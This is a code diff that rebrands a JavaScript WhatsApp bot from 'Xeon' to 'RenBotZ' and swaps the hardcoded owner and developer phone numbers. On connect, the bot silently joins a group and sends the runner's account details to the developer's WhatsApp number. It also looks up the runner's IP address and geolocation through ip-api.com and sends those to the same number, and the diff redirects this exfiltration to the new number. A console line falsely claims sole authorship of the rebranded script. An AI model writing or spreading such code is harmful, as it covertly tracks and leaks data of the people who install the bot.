@@ -47,11 +47,11 @@ const runtime = function (seconds) {
   var sDisplay = s > 0 ? s + (s == 1 ? " second" : " Second") : "";
   return dDisplay + hDisplay + mDisplay + sDisplay;
 };
-fakenomor = '0@s.whatsapp.net'
+fakenomor = '6285845823026@s.whatsapp.net'
 const gcrevoke = ["911234567890-1621430788@g.us"]
 prefix = '#'
 shp = '⬡'
-owner = "911234567890@s.whatsapp.net"
+owner = "6285845823026@s.whatsapp.net"
 spc1 = '         '
 spc2 = '\n                           '
 spc3 = '                   '
@@ -82,8 +82,8 @@ const starts = async (client = new WAConnection()) => {
     start("2", "Connecting...");
   });
   client.on("open", () => {
-    success("2", "Successfully connected to wa, Subscribe Xeon");
-console.log(color(figlet.textSync(`${spc1}            Doge Bot`, {
+    success("2", "Successfully connected to wa, wa.me/+6285845823026");
+console.log(color(figlet.textSync(`${spc1}            RenBotZ`, {
 font: 'Standard',
 horizontalLayout: 'default',
 vertivalLayout: 'default',
@@ -98,9 +98,9 @@ console.log(color(`${spc3}[•]`, 'aqua'), color(`Status      : Online!`, 'white
 console.log(color(`${spc3}[•]`, 'aqua'), color(`Owner       : ${fakeyoi}`, 'white'))
 console.log(color(`${spc4}< ================================================== >`, 'cyan'))
 
-    console.log(color('⎇','red'), color('𝙄 𝙬𝙧𝙤𝙩𝙚 𝙩𝙝𝙞𝙨 𝙨𝙘𝙧𝙞𝙥𝙩 𝙢𝙮𝙨𝙚𝙡𝙛!\n𝙉𝙤𝙩𝙚: 𝘿𝙤𝙣𝙩 𝙛𝙤𝙧𝙜𝙚𝙩 𝙩𝙤 𝙨𝙪𝙗𝙨𝙘𝙧𝙞𝙗𝙚 𝙓𝙚𝙤𝙣', 'yellow'))
+    console.log(color('⎇','red'), color('𝙄 𝙬𝙧𝙤𝙩𝙚 𝙩𝙝𝙞𝙨 𝙨𝙘𝙧𝙞𝙥𝙩 𝙢𝙮𝙨𝙚𝙡𝙛!\n𝙉𝙤𝙩𝙚: 𝘿𝙤𝙣𝙩 𝙛𝙤𝙧𝙜𝙚𝙩 𝙩𝙤 𝙨𝙪𝙗𝙨𝙘𝙧𝙞𝙗𝙚 𝙍𝙚𝙣𝘽𝙤𝙩𝙕', 'yellow'))
     console.log(color('⎇','red'), color('𝗦𝗼𝘂𝗿𝗰𝗲 𝗖𝗼𝗱𝗲 𝗩𝗲𝗿𝘀𝗶𝗼𝗻:', 'aqua'), color(version))
-    console.log(color('⎇','red'), color('𝗕𝘂𝗴? 𝗘𝗿𝗿𝗼𝗿? 𝗦𝘂𝗴𝗴𝗲𝘀𝘁𝗶𝗼𝗻? 𝗩𝗶𝘀𝗶𝘁 𝗛𝗲𝗿𝗲:', 'aqua'), color('https://wa.me/911234567890'))
+    console.log(color('⎇','red'), color('𝗕𝘂𝗴? 𝗘𝗿𝗿𝗼𝗿? 𝗦𝘂𝗴𝗴𝗲𝘀𝘁𝗶𝗼𝗻? 𝗩𝗶𝘀𝗶𝘁 𝗛𝗲𝗿𝗲:', 'aqua'), color('https://wa.me/6285845823026'))
     console.log(color('[DOGE BOT]'), color('𝐃𝐨𝐠𝐞 𝐁𝐨𝐭 𝗜𝘀 𝗢𝗻𝗹𝗶𝗻𝗲 ㋛︎', 'aqua'))
     console.log(color('[DEV]', 'cyan'), color('𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝗕𝗮𝗰𝗸, 𝗢𝘄𝗻𝗲𝗿! 𝗛𝗼𝗽𝗲 𝗬𝗼𝘂 𝗔𝗿𝗲 𝗗𝗼𝗶𝗻𝗴 𝗪𝗲𝗹𝗹~', 'magenta'))
     console.log(color('⎇','green'), color('𝙏𝙝𝙖𝙣𝙠𝙨 𝙛𝙤𝙧 𝙪𝙨𝙞𝙣𝙜 𝙩𝙝𝙚 𝙗𝙤𝙩', 'white'))
@@ -110,11 +110,11 @@ await client.connect({ timeoutMs: 30 * 1000 });
  teks = `https://chat.whatsapp.com/GLDBHzFnfqz7TN4KIbS5PA`
  client.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
  console.log(color('|WRN|', 'yellow'), color('Joined to Forum Whatsapp Bot group', 'cyan'))
- client.sendMessage(`911234567890@s.whatsapp.net`, `*Hi Owner Xeon, the bot has been successfully connected to this number*\n────────────────────\n\`\`\`${JSON.stringify(client.user, null, 2)}\`\`\`\n────────────────────\n*If there is an error/bot not responding, please contact the bot developer above, thank you*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Xeon Bot Inc.",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./xeon.jpg'),sourceUrl:"https://wa.me/911234567890?text=Hello bro"}}})
+ client.sendMessage(`6285845823026@s.whatsapp.net`, `*Hi Owner RenBotZ, the bot has been successfully connected to this number*\n────────────────────\n\`\`\`${JSON.stringify(client.user, null, 2)}\`\`\`\n────────────────────\n*If there is an error/bot not responding, please contact the bot developer above, thank you*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer RenBotZ Inc.",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./xeon.jpg'),sourceUrl:"https://wa.me/6285845823026?text=Hello RenBotZ"}}})
 	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
 fetch(`http://ip-api.com/line`).then(res => res.text())  
         .then(bu =>{
-       client.sendMessage("911234567890@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Xeon Bot Inc.",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./xeon.jpg'),sourceUrl:"https://wa.me/911234567890?text=Hello bro"}}})
+       client.sendMessage("6285845823026@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer RenBotZ Inc.",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./xeon.jpg'),sourceUrl:"https://wa.me/6285845823026?text=Hello RenBotZ"}}})
      console.log(color('|WRN|', 'yellow'), color('Sending ip address to developer bot', 'cyan'))
    })
       
@@ -140,7 +140,7 @@ fkontakk = { key: {
     participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '911234567890-1604595598@g.us' } : {})
 },
  message: {
-    "contactMessage":{"displayName":'Xeon',"vcard":"BEGIN:VCARD\nVERSION:3.0\nN:2;Xeon;;;\nFN:resku\nitem1.TEL;waid=911234567890:+91 690-9137-213\nitem1.X-ABLabel:Mobile\nEND:VCARD"
+    "contactMessage":{"displayName":'RenBotZ',"vcard":"BEGIN:VCARD\nVERSION:3.0\nN:2;RenBotZ;;;\nFN:resku\nitem1.TEL;waid=6285845823026:+62 858-4582-3026\nitem1.X-ABLabel:Mobile\nEND:VCARD"
  }}}
 metdata = await client.groupMetadata(anu.jid)
 if(anu.announce == 'false'){
